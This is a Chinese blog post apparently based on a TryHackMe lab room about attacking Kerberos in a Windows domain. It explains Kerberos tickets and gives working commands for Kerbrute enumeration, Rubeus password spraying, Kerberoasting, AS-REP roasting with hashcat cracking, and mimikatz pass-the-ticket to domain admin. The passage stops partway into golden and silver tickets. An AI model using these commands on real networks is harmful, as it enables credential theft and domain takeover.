<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"sugarcrashx.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="介绍这个房间将涵盖攻击 Kerberos 的所有基础知识以及 windows 票证授予服务；我们将介绍以下内容：">
<meta property="og:type" content="article">
<meta property="og:title" content="Kerberos">
<meta property="og:url" content="https://sugarcrashx.github.io/2022/06/06/Kerberos/index.html">
<meta property="og:site_name" content="SugarCrash!">
<meta property="og:description" content="介绍这个房间将涵盖攻击 Kerberos 的所有基础知识以及 windows 票证授予服务；我们将介绍以下内容：">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2022/06/06/EILoZkUFcrVDani.png">
<meta property="og:image" content="https://s2.loli.net/2022/06/06/Ih8X1vYuRfnNQPd.png">
<meta property="og:image" content="https://s2.loli.net/2022/06/06/l1ibTcAUFCzK4Sg.png">
<meta property="og:image" content="https://sugarcrashx.github.io/">
<meta property="og:image" content="https://s2.loli.net/2022/06/06/A1iewL5GNUvCstz.png">
<meta property="og:image" content="https://s2.loli.net/2022/06/06/kxJ1ebEpCwlcsSg.png">
<meta property="og:image" content="https://s2.loli.net/2022/06/06/9BebHk4TdtgxPaO.png">
<meta property="og:image" content="https://s2.loli.net/2022/06/06/IJdULjs37pkrcAO.png">
<meta property="og:image" content="https://s2.loli.net/2022/06/06/DrbmOtA5n4IPfL3.png">
<meta property="og:image" content="https://s2.loli.net/2022/06/06/QciJ5NZR4MFgOpD.png">
<meta property="og:image" content="https://s2.loli.net/2022/06/06/3SGvfFUmwRnJojz.png">
<meta property="og:image" content="https://s2.loli.net/2022/06/06/o86afPru5plS9bZ.png">
<meta property="og:image" content="https://s2.loli.net/2022/06/06/i2b71KDWkj4sYmX.png">
<meta property="og:image" content="https://s2.loli.net/2022/06/06/zOADSmQo8wuMyBp.png">
<meta property="og:image" content="https://s2.loli.net/2022/06/06/TxK6yE38aRhSXPQ.png">
<meta property="og:image" content="https://s2.loli.net/2022/06/06/O9ZwPLyRvE3lzF5.png">
<meta property="og:image" content="https://s2.loli.net/2022/06/06/owtxcTMPdK5vFbi.png">
<meta property="og:image" content="https://s2.loli.net/2022/06/06/U6AME8FnsjiW4vh.png">
<meta property="og:image" content="https://s2.loli.net/2022/06/06/2zKkZAtTvsNMl3q.png">
<meta property="og:image" content="https://s2.loli.net/2022/06/06/MZdzVjENY3vwH6S.png">
<meta property="og:image" content="https://s2.loli.net/2022/06/06/9ZFf4dRvqGc2Cj1.png">
<meta property="og:image" content="https://s2.loli.net/2022/06/06/eS3DvAEisf589UN.png">
<meta property="og:image" content="https://s2.loli.net/2022/06/06/HNGQv4Ft2s6RgOP.png">
<meta property="og:image" content="https://s2.loli.net/2022/06/06/P6ZRhHpYmrsNDeV.png">
<meta property="og:image" content="https://s2.loli.net/2022/06/06/pKT4UaqvGS8wObm.png">
<meta property="article:published_time" content="2022-06-06T07:46:41.000Z">
<meta property="article:modified_time" content="2022-06-06T07:47:10.202Z">
<meta property="article:author" content="Lu1i丶">
<meta property="article:tag" content="Tryhackme">
<meta property="article:tag" content="内网">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2022/06/06/EILoZkUFcrVDani.png">

<link rel="canonical" href="https://sugarcrashx.github.io/2022/06/06/Kerberos/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>Kerberos | SugarCrash!</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">SugarCrash!</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">记录学习，想找个师傅带带我</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://sugarcrashx.github.io/2022/06/06/Kerberos/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/1.PNG">
      <meta itemprop="name" content="Lu1i丶">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SugarCrash!">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Kerberos
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-06-06 15:46:41 / 修改时间：15:47:10" itemprop="dateCreated datePublished" datetime="2022-06-06T15:46:41+08:00">2022-06-06</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tryhackme/" itemprop="url" rel="index"><span itemprop="name">Tryhackme</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2022/06/06/Kerberos/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2022/06/06/Kerberos/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>这个房间将涵盖攻击 Kerberos 的所有基础知识以及 windows 票证授予服务；我们将介绍以下内容：</p>
<span id="more"></span>
<ul>
<li>使用 Kerbrute 和 Rubeus 等工具进行初始枚举</li>
<li>kerberoasting</li>
<li>使用 Rubeus 和 Impacket 进行 AS-REP 烘焙</li>
<li>金&#x2F;银票攻击</li>
<li>传票</li>
<li>使用 mimikatz 的万能钥匙攻击</li>
</ul>
<h5 id="什么是Kerberos？"><a href="#什么是Kerberos？" class="headerlink" title="什么是Kerberos？"></a>什么是Kerberos？</h5><p>Kerberos 是 Microsoft Windows 域的默认身份验证服务。通过使用第三方票证授权以及更强的加密，它旨在比 NTLM 更“安全”。尽管 NTLM 有更多的攻击向量可供选择，但 Kerberos 仍然有一些潜在的漏洞，就像我们可以利用的 NTLM 一样。</p>
<h5 id="常用术语"><a href="#常用术语" class="headerlink" title="常用术语"></a>常用术语</h5><ul>
<li><p><strong>票证授予票证 (TGT)</strong> - 票证授予票证是一种身份验证票证，用于从 TGS 向域中的特定资源请求服务票证。</p>
</li>
<li><p><strong>密钥分发中心 (KDC)</strong> - 密钥分发中心是一种用于发布 TGT 和服务票证的服务，包括身份验证服务和票证授予服务。</p>
</li>
<li><p><strong>身份验证服务</strong><strong>(AS)</strong> - 身份验证服务发出 TGT 以供域中的 TGS 使用， 以请求访问其他机器和服务票证。</p>
</li>
<li><p><strong>票证授予服务 (TGS)</strong> - 票证授予服务获取 TGT 并将票证返回到域上的机器。  </p>
</li>
<li><p><strong>服务主体名称 (SPN)</strong> - 服务主体名称是提供给服务实例的标识符，用于将服务实例与域服务帐户相关联。Windows 要求服务具有域服务帐户，这就是服务需要 SPN 集的原因。</p>
</li>
<li><p><strong>KDC 长期密钥 (KDC LT Key)</strong>  - KDC 密钥基于 KRBTGT 服务帐户。它用于加密 TGT 和签署 PAC。</p>
</li>
<li><p><strong>客户端长期密钥（客户端 LT 密钥）</strong>  - 客户端密钥基于计算机或服务帐户。它用于检查加密的时间戳并加密会话密钥。</p>
</li>
<li><p><strong>Service Long Term Secret Key (Service LT Key)</strong>  - 服务密钥基于服务帐户。它用于加密服务票证的服务部分并签署 PAC。</p>
</li>
<li><p><strong>会话密钥</strong>- 在发布 TGT 时由 KDC 发布。用户在请求服务票证时将向 KDC 提供会话密钥以及 TGT。</p>
</li>
<li><p><strong>特权属性证书 (PAC)</strong> - PAC 保存用户的所有相关信息，它与 TGT 一起发送到 KDC，由目标 LT 密钥和 KDC LT 密钥签名，以验证用户。</p>
</li>
</ul>
<h5 id="详细的带预认证的AS-REQ"><a href="#详细的带预认证的AS-REQ" class="headerlink" title="详细的带预认证的AS-REQ"></a>详细的带预认证的AS-REQ</h5><p>当用户从 KDC 请求 TGT 时，Kerberos 身份验证中的 AS-REQ 步骤开始。为了验证用户并为用户创建 TGT，KDC 必须遵循这些确切的步骤。第一步是用户加密时间戳 NT 哈希并将其发送到 AS。KDC 尝试使用来自用户的 NT 散列来解密时间戳，如果成功，KDC 将为用户发布 TGT 以及会话密钥。</p>
<h5 id="TGT内容"><a href="#TGT内容" class="headerlink" title="TGT内容"></a>TGT内容</h5><p>为了了解服务票证是如何创建和验证的，我们需要从票证的来源开始；TGT 由用户提供给 KDC，作为回报，KDC 验证 TGT 并返回服务票证。<br><img src="https://s2.loli.net/2022/06/06/EILoZkUFcrVDani.png"></p>
<h5 id="服务单内容"><a href="#服务单内容" class="headerlink" title="服务单内容"></a>服务单内容</h5><p>要了解 Kerberos 身份验证的工作原理，您首先需要了解这些票证包含什么以及如何验证它们。服务票据包含两部分：服务提供部分和用户提供部分。我会把它分解成每个部分包含的内容。</p>
<ul>
<li>服务部分：用户详细信息、会话密钥、使用服务帐户 NTLM 哈希加密票证。</li>
<li>用户部分：有效性时间戳、会话密钥、使用 TGT 会话密钥加密。</li>
</ul>
<h5 id="Kerberos-身份验证概述"><a href="#Kerberos-身份验证概述" class="headerlink" title="Kerberos 身份验证概述"></a>Kerberos 身份验证概述</h5><p><img src="https://s2.loli.net/2022/06/06/Ih8X1vYuRfnNQPd.png"></p>
<p>AS-REQ - 1.) 客户端请求身份验证票证或票证授予票证 (TGT)。<br>AS-REP - 2.) 密钥分发中心验证客户端并发回加密的 TGT。<br>TGS-REQ - 3.) 客户端将加密的 TGT 发送到带有客户端想要访问的服务的服务主体名称 (SPN) 的票证授予服务器 (TGS)。<br>TGS-REP - 4.) 密钥分发中心 (KDC) 验证用户的 TGT 以及用户有权访问服务，然后将服务的有效会话密钥发送给客户端。<br>AP-REQ -  5.) 客户端请求服务并发送有效的会话密钥以证明用户具有访问权限。<br>AP-REP - 6.) 服务授予访问权限</p>
<h5 id="Kerberos-票证概览"><a href="#Kerberos-票证概览" class="headerlink" title="Kerberos 票证概览"></a>Kerberos 票证概览</h5><p>您将看到的主要票证是授予票证的票证，这些票证可以以各种形式出现，例如 Rubeus 的 .kirbi 和 Impacket 的.ccache。您将看到的主要票是 .kirbi 票。票证通常是 base64 编码，可用于各种攻击。授予票证的票证仅与 KDC 一起使用以获取服务票证。将 TGT 提供给服务器后，服务器将获取用户详细信息、会话密钥，然后使用服务帐户 NTLM 哈希加密票证。然后，您的 TGT 会给出加密的时间戳、会话密钥和加密的 TGT。然后，KDC 将对 TGT 进行身份验证并返回所请求服务的服务票证。普通的 TGT 仅适用于与其连接的给定服务帐户，但是 KRBTGT 允许您获得所需的任何服务票证，从而允许您访问所需域上的任何内容。</p>
<h5 id="攻击权限要求"><a href="#攻击权限要求" class="headerlink" title="攻击权限要求"></a>攻击权限要求</h5><ul>
<li>Kerbrute 枚举 - 无需域访问 </li>
<li>传递票证 - 以用户身份访问所需的域</li>
<li>Kerberoasting - 以任何需要的用户身份访问</li>
<li>AS-REP Roasting - 以任何需要的用户身份访问  </li>
<li>Golden Ticket - 需要完整的域妥协（域管理员） </li>
<li>Silver Ticket - 需要服务哈希 </li>
<li>万能钥匙 - 需要完整的域妥协（域管理员）</li>
</ul>
<p><strong>KDC由AS,TGS两项服务组成</strong></p>
<h4 id="Kerbrute的枚举"><a href="#Kerbrute的枚举" class="headerlink" title="Kerbrute的枚举"></a>Kerbrute的枚举</h4><p>Kerbrute 是一种流行的枚举工具，用于通过滥用 Kerberos 预身份验证来暴力破解和枚举有效的活动目录用户。<br>下载安装</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/ropnop/kerbrute/releases">https://github.com/ropnop/kerbrute/releases</a></p>
</blockquote>
<p>您需要将DNS域名与机器 IP添加 到攻击者机器内部的 &#x2F;etc&#x2F;hosts 中，否则这些攻击对您不起作用 -<code>10.10.2.254  CONTROLLER.local</code></p>
<h5 id="滥用预认证概述"><a href="#滥用预认证概述" class="headerlink" title="滥用预认证概述"></a>滥用预认证概述</h5><p>通过强制 Kerberos 预身份验证，您不会触发帐户登录失败事件，这可能会向蓝队抛出红旗。当通过 Kerberos 进行暴力破解时，您可以通过仅向 KDC 发送单个UDP帧来进行暴力破解，从而允许您从单词列表中枚举域上的用户。</p>
<h5 id="使用Kerbrute-枚举用户"><a href="#使用Kerbrute-枚举用户" class="headerlink" title="使用Kerbrute 枚举用户"></a>使用Kerbrute 枚举用户</h5><p>下载词表</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt">https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt</a></p>
</blockquote>
<p><code>./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt</code><br>这将使用提供的单词列表从域控制器中暴力破解用户帐户<br><img src="https://s2.loli.net/2022/06/06/l1ibTcAUFCzK4Sg.png"></p>
<h4 id="Rubeus-的收获和暴力破解门票"><a href="#Rubeus-的收获和暴力破解门票" class="headerlink" title="Rubeus 的收获和暴力破解门票"></a>Rubeus 的收获和暴力破解门票</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a><br>Rubeus 是攻击 Kerberos 的强大工具。Rubeus 是对 kekeo 工具的改编，由著名的活动目录专家 HarmJ0y 开发。<br>Rubeus 具有多种攻击和功能，使其成为攻击 Kerberos 的通用工具。许多工具和攻击中的一部分包括越过哈希、票证请求和续订、票证管理、票证提取、收获、通过票证、AS-REP 烘焙和 Kerberoasting。<br><img src="/" alt="Uploading file...jw9bk"></p>
</blockquote>
<p><img src="https://s2.loli.net/2022/06/06/A1iewL5GNUvCstz.png"></p>
<h5 id="用Rubeus收获门票"><a href="#用Rubeus收获门票" class="headerlink" title="用Rubeus收获门票"></a>用Rubeus收获门票</h5><p>在目标机器上编译运行<br><code>Rubeus.exe harvest /interval:30</code><br>该命令告诉 Rubeus 每 30 秒收获一次 TGT<br><img src="https://s2.loli.net/2022/06/06/kxJ1ebEpCwlcsSg.png"></p>
<h5 id="使用-Rubeus-进行暴力破解-x2F-密码喷洒"><a href="#使用-Rubeus-进行暴力破解-x2F-密码喷洒" class="headerlink" title="使用 Rubeus 进行暴力破解&#x2F;密码喷洒"></a>使用 Rubeus 进行暴力破解&#x2F;密码喷洒</h5><p>Rubeus 既可以暴力破解密码，也可以破解密码喷射用户帐户。当暴力破解密码时，您使用单个用户帐户和密码单词表来查看哪个密码适用于该给定用户帐户。在密码喷射中，您提供一个密码，例如 Password1，然后对域中所有找到的用户帐户进行“喷射”，以找出可能拥有该密码的用户帐户。</p>
<p>这种攻击将获取一个给定的基于 Kerberos 的密码，并将其喷洒到所有找到的用户上，并给出一个 .kirbi 票证。此票证是一个 TGT，可用于从 KDC 获取服务票证，也可用于通过票证攻击等攻击。</p>
<p>在使用 Rubeus 进行密码喷洒之前，您需要将域控制器域名添加到 windows 主机文件中。您可以使用 echo 命令将 IP 和域名添加到机器中的 hosts 文件中：<br><code>echo 10.10.2.254 CONTROLLER.local &gt;&gt; C:\Windows\System32\drivers\etc\hosts</code></p>
<p><code>Rubeus.exe brute /password:Password1 /noticket</code><br>这将采用给定的密码并将其“喷洒”给所有找到的用户，然后为该用户提供 .kirbi TGT</p>
<p><img src="https://s2.loli.net/2022/06/06/9BebHk4TdtgxPaO.png"></p>
<h5 id="Rubeus-和-Impacket-的-Kerberoasting"><a href="#Rubeus-和-Impacket-的-Kerberoasting" class="headerlink" title="Rubeus 和 Impacket 的 Kerberoasting"></a>Rubeus 和 Impacket 的 Kerberoasting</h5><p>最流行的 Kerberos 攻击之一——Kerberoasting。<br>Kerberoasting 允许用户为具有已注册 SPN 的任何服务请求服务票证，然后使用该票证来破解服务密码。如果服务有注册的 SPN，那么它可以是 Kerberoastable，但是攻击的成功取决于密码的强度、是否可跟踪以及破解服务帐户的权限。要枚举 Kerberoastable 帐户，我建议使用像 BloodHound 这样的工具来查找所有 Kerberoastable 帐户，它可以让您查看如果他们是域管理员可以使用 kerberoast 的帐户类型，以及他们与域的其余部分的连接类型。这有点超出了这个房间的范围，但它是寻找目标客户的好工具。<a target="_blank" rel="noopener" href="https://tryhackme.com/room/postexploit"></a></p>
<p>为了执行攻击，我们将同时使用 Rubeus 和 Impacket，以便您了解用于 Kerberoasting 的各种工具。还有其他工具，例如 kekeo 和 Invoke-Kerberoast，但我会让您自己研究这些工具。</p>
<p>Rubeus 的 Kerberoasting</p>
<p>这将转储任何 kerberoastable 用户的 Kerberos 哈希<br><code>Rubeus.exe kerberoast &gt; result.txt</code><br><img src="https://s2.loli.net/2022/06/06/IJdULjs37pkrcAO.png"></p>
<p>踩坑<br>把hash复制到本机notepad++清理一下换行符和空格才能用hashcat跑<br><img src="https://s2.loli.net/2022/06/06/DrbmOtA5n4IPfL3.png"><br><code>hashcat -m 13100 -a 0 hash.txt rockyou.txt</code><br><img src="https://s2.loli.net/2022/06/06/QciJ5NZR4MFgOpD.png"></p>
<h5 id="法二Impacket"><a href="#法二Impacket" class="headerlink" title="法二Impacket"></a>法二Impacket</h5><p>Impacket 版本自 0.9.20 以来一直不稳定 我建议安装 Impacket &lt; 0.9.20<br>1.)<code>cd /opt</code> 导航到您的首选目录以将工具保存在 </p>
<p>2.) 从 <a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19">https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19下载预编译包</a></p>
<p>3.)<code>cd Impacket-0.9.19</code> 导航到 impacket 目录</p>
<p>4.) <code>pip install .</code>- 这将安装所有需要的依赖项</p>
<h5 id="Impacket-的-Kerberoasting"><a href="#Impacket-的-Kerberoasting" class="headerlink" title="Impacket 的 Kerberoasting"></a>Impacket 的 Kerberoasting</h5><p>impacket&#x2F;examples&#x2F;GetUserSPNs.py<br><code>python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.2.254 -request</code><br>这将转储它可以在目标域上找到的所有 kerberoastable 帐户的 Kerberos 哈希，就像 Rubeus 一样；但是，这不必在目标机器上，可以远程完成。<br><img src="https://s2.loli.net/2022/06/06/3SGvfFUmwRnJojz.png"><br><code>hashcat -m 13100 -a 0 hash.txt Pass.txt</code><br><img src="https://s2.loli.net/2022/06/06/o86afPru5plS9bZ.png"><br>这个工具没有格式问题，hashcat直接跑</p>
<h4 id="AS-REP-烘烤与-Rubeus"><a href="#AS-REP-烘烤与-Rubeus" class="headerlink" title="AS-REP 烘烤与 Rubeus"></a>AS-REP 烘烤与 Rubeus</h4><p>与 Kerberoasting 非常相似，AS-REP Roasting 会转储禁用 Kerberos 预身份验证的用户帐户的 krbasrep5 哈希值。与 Kerberoasting 不同，这些用户不必是服务帐户，能够 AS-REP 烘焙用户的唯一要求是用户必须禁用预身份验证。</p>
<p>我们将继续使用 Rubeus，就像我们使用 kerberoasting 和收获一样，因为 Rubeus 有一个非常简单且易于理解的命令来 AS-REP 烘烤和攻击禁用 Kerberos 预身份验证的用户。从 Rubeus 转储散列后，我们将使用 hashcat 来破解 krbasrep5 散列。</p>
<p>还有其他用于 AS-REP Roasting 的工具，例如 kekeo 和 Impacket 的 GetNPUsers.py。Rubeus 更易于使用，因为它会自动找到 AS-REP Roastable 用户，而使用 GetNPUsers 您必须事先枚举用户并知道哪些用户可能是 AS-REP Roastable。</p>
<h5 id="AS-REP-烘焙概述"><a href="#AS-REP-烘焙概述" class="headerlink" title="AS-REP 烘焙概述"></a>AS-REP 烘焙概述</h5><p>在预身份验证期间，用户哈希将用于加密域控制器将尝试解密的时间戳，以验证正在使用正确的哈希并且没有重播先前的请求。在验证时间戳之后，KDC 将为用户发出一个 TGT。如果禁用预身份验证，您可以为任何用户请求任何身份验证数据，并且 KDC 将返回一个可以离线破解的加密 TGT，因为 KDC 跳过了验证用户是否真的是他们所说的那个人的步骤。</p>
<h5 id="使用Rubeus-转储-KRBASREP5-哈希"><a href="#使用Rubeus-转储-KRBASREP5-哈希" class="headerlink" title="使用Rubeus 转储 KRBASREP5 哈希"></a>使用Rubeus 转储 KRBASREP5 哈希</h5><p><code>Rubeus.exe asreproast</code><br>这将运行 AS-REP 烤命令寻找易受攻击的用户，然后转储发现的易受攻击的用户哈希。</p>
<p>导出hash 在$krb5asrep$ 之后插入 23$<br><img src="https://s2.loli.net/2022/06/06/i2b71KDWkj4sYmX.png"><br><code>hashcat -m 18200 hash.txt Pass.txt</code><br>Rubeus AS-REP Roasting 使用 hashcat 模式 18200</p>
<p><img src="https://s2.loli.net/2022/06/06/zOADSmQo8wuMyBp.png"><br><img src="https://s2.loli.net/2022/06/06/TxK6yE38aRhSXPQ.png"></p>
<h4 id="使用mimikatz传递票证"><a href="#使用mimikatz传递票证" class="headerlink" title="使用mimikatz传递票证"></a>使用mimikatz传递票证</h4><p>Mimikatz 是一个非常流行且功能强大的后期利用工具，最常用于在活动目录网络中转储用户凭据，但也可以使用 mimikatz 从 LSASS 内存中转储 TGT</p>
<p>这只是对通过票证攻击如何工作的概述，因为 THM 目前不支持网络，但我挑战你在自己的网络上配置它。</p>
<p>您可以在给定的机器上运行此攻击，但是由于域控制器的设置方式，您将从域管理员升级为域管理员。</p>
<h5 id="通票概览"><a href="#通票概览" class="headerlink" title="通票概览"></a>通票概览</h5><p>通过从机器的 LSASS 内存中转储 TGT 来传递票证。本地安全机构子系统服务 (LSASS) 是一个内存进程，将凭据存储在活动目录服务器上，并且可以将 Kerberos 票证与其他凭据类型一起存储，以充当网守并接受或拒绝提供的凭据。您可以像转储哈希一样从 LSASS 内存中转储 Kerberos 票证。当您使用 mimikatz 转储票证时，它会给我们一个 .kirbi 票证，如果域管理员票证在 LSASS 内存中，它可用于获取域管理员。如果周围存在不安全的域服务帐户票证，则此攻击非常适合特权升级和横向移动。如果您转储域管理员，该攻击允许您升级为域管理员 s 票，然后使用 mimikatz PTT 攻击模拟该票，允许您充当该域管理员。您可以将票证攻击视为通过票证攻击，例如重用现有票证并没有创建或销毁任何票证，这里只是重用域中另一个用户的现有票证并模拟该票证。</p>
<h5 id="准备-Mimikatz-amp-Dump-门票"><a href="#准备-Mimikatz-amp-Dump-门票" class="headerlink" title="准备 Mimikatz &amp; Dump 门票"></a>准备 Mimikatz &amp; Dump 门票</h5><p>您需要以管理员身份运行命令提示符：使用与进入计算机时相同的凭据。如果您没有提升的命令提示符，mimikatz 将无法正常工作。</p>
<p><code>mimikatz.exe</code><br><code>privilege::debug</code><br>请确保输出 [output ‘20’ OK]，这意味着您没有正确运行 mimikatz 的管理员权限</p>
<p><img src="https://s2.loli.net/2022/06/06/O9ZwPLyRvE3lzF5.png"></p>
<p><code>sekurlsa::tickets /export</code> - 这会将所有 .kirbi 票证导出到您当前所在的目录中<br>找管理员票证类似管理员的关键词<br><img src="https://s2.loli.net/2022/06/06/owtxcTMPdK5vFbi.png"></p>
<h4 id="使用票据"><a href="#使用票据" class="headerlink" title="使用票据"></a>使用票据</h4><p>现在我们已经准备好票证，我们现在可以执行通过票证攻击以获得域管理员权限。<br><code>kerberos::ptt &lt;ticket&gt;</code> - 在 mimikatz 中使用您之前获得的票证运行此命令。它将缓存并模拟给定的票证<br><img src="https://s2.loli.net/2022/06/06/U6AME8FnsjiW4vh.png"><br>提示ok就行了</p>
<p>klist  这里只是通过列出我们缓存的票证来验证我们是否成功模拟了票证。<br><img src="https://s2.loli.net/2022/06/06/2zKkZAtTvsNMl3q.png"></p>
<p>现在已冒充票证，赋予您与您所冒充的 TGT 相同的权利。为了验证这一点，我们可以查看管理员共享。</p>
<p><img src="https://s2.loli.net/2022/06/06/MZdzVjENY3vwH6S.png"></p>
<p>请注意，这只是一个 POC，用于了解如何通过票证并获得域管理员您通过票证的方式可能会根据您参与的类型而有所不同，因此不要将其作为有关如何通过票证的明确指南运行此攻击。</p>
<h5 id="通过票证缓解"><a href="#通过票证缓解" class="headerlink" title="通过票证缓解"></a>通过票证缓解</h5><p>让我们谈谈蓝队以及如何减轻这些类型的攻击。 </p>
<ul>
<li>不要让您的域管理员登录域控制器以外的任何东西——这很简单，但是许多域管理员仍然登录到低级计算机上，留下票证，我们可以用来攻击和横向移动。</li>
</ul>
<h4 id="mimikatz的金-x2F-银票攻击"><a href="#mimikatz的金-x2F-银票攻击" class="headerlink" title="mimikatz的金&#x2F;银票攻击"></a>mimikatz的金&#x2F;银票攻击</h4><p>Mimikatz 是一种非常流行且功能强大的后期利用工具，最常用于将用户凭据转储到活动目录网络中，但也可以使用 mimikatz 来创建银票。<br>银票有时比金票更适合用于实战，因为它更加谨慎。如果隐身和不被发现很重要，那么银票可能是比金票更好的选择，但是创建一张票的方法是完全相同的。两张票之间的主要区别在于，银票仅限于目标服务，而金票可以访问任何 Kerberos 服务。</p>
<p>银票的特定使用场景是您想要访问域的 SQL 服务器，但您当前的受感染用户无权访问该服务器。您可以通过对该服务进行 kerberoasting 来找到一个可访问的服务帐户以获得立足点，然后您可以转储服务哈希，然后模拟他们的 TGT，以便从 KDC 请求 SQL 服务的服务票证，从而允许您访问域的 SQL服务器。</p>
<h5 id="KRBTGT-概述"><a href="#KRBTGT-概述" class="headerlink" title="KRBTGT 概述"></a>KRBTGT 概述</h5><p>为了充分了解这些攻击的工作原理，您需要了解 KRBTGT 和 TGT 之间的区别。KRBTGT 是 KDC 的服务帐户，这是向客户发放所有票证的密钥分发中心。如果您冒充此帐户并从 KRBTGT 创建一个黄金票证，您就可以为您想要的任何东西创建一个服务票证。TGT 是由 KDC 颁发的服务帐户的票证，并且只能访问 TGT 来自的服务，就像 SQLService 票证一样。</p>
